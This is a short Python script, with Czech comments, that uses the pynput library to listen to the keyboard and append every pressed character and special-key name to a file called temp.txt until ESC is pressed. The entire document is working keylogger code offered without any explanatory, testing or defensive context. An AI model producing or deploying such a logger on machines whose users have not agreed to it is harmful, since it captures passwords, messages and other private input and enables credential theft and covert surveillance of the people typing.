from pynput import keyboard

# Funkce, která se spustí při stisknutí klávesy
def on_press(key):
    try:
        with open('temp.txt', 'a') as f:
            f.write('{}\n'.format(key.char))
    except AttributeError:
        # Zpracování speciálních kláves
        with open('temp.txt', 'a') as f:
            f.write('Special Key: {}\n'.format(key))

# Funkce, která se spustí při uvolnění klávesy
def on_release(key):
    if key == keyboard.Key.esc:
        # Ukončit poslech, když je stisknuta ESC
        return False

# Hlavní část skriptu
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()